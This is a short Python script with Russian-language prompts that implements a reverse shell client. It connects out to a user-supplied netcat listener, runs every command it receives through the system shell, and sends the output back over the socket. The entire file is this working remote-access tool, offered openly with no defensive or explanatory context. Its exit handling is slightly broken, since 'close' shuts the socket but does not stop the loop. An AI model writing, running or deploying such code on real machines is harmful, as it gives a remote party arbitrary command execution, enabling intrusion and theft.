import socket
import subprocess


SERVER_HOST = input('Введите айпи адрес прослушиваемый netcat сервером (ENTER для 127.0.0.1): ')

if not SERVER_HOST:
    SERVER_HOST = '127.0.0.1'

SERVER_PORT = int(input('Порт netcat сервера: '))

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client_socket.connect((SERVER_HOST, SERVER_PORT))
except Exception as e:
    print('Ошибка: ', e)
    input('Нажмите ENTER для выхода..')
run = True

client_socket.send('Введите "close" для выхода. Ожидание ввода комманд...\n'.encode('utf-8'))
print('Успешно подключено. Ожидание ввода комманд...')


def execute_command(command):
    global run
    print(f'Принятая комманда: {command}')

    try:
        subprocess.check_output('chcp 65001', shell=True)
        result = subprocess.check_output(command, shell=True, text=True)
        print(result)
        return result
    except Exception as e:
        print(e)
        return f'Комманда не найдена\n'


while run:
    command = client_socket.recv(1024).decode('utf-8')
    if command:
        if command == 'close\n':
            client_socket.close()

        result = execute_command(command)
        client_socket.send(result.encode('utf-8'))
